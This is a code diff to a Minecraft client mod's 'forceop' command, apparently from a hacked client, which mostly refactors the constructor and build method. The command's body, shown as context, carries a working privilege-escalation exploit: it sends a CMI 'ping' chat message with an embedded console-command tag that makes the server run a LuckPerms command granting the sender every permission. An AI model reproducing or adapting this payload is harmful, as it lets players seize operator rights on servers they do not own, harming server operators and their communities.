@@ -17,21 +17,17 @@ public class ForceOPCommand extends Command {
 
     /**
      * Constructs a new instance of the ForceOPCommand class.
-     *
-     * @param minecraftClient The Minecraft client instance.
      */
-    public ForceOPCommand(MinecraftClient minecraftClient) {
-        super("forceop", "Gives OP thru CMI console command sender exploit", minecraftClient);
+    public ForceOPCommand() {
+        super("forceop", "Gives OP thru CMI console command sender exploit");
     }
 
     /**
      * Builds the command using Brigadier's command builder.
-     *
-     * @return The built command.
      */
     @Override
-    public LiteralArgumentBuilder<CommandSource> build() {
-        return literal(getName())
+    public void build(LiteralArgumentBuilder<CommandSource> root) {
+        root
                 .executes((context -> {
                     // Sends a CMI console command to set the player's permissions to true using LuckPerms.
                     Objects.requireNonNull(getMinecraftClient().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get luckperms</T><CC>lp user " + getMinecraftClient().getSession().getUsername() + " p set * true</CC>");
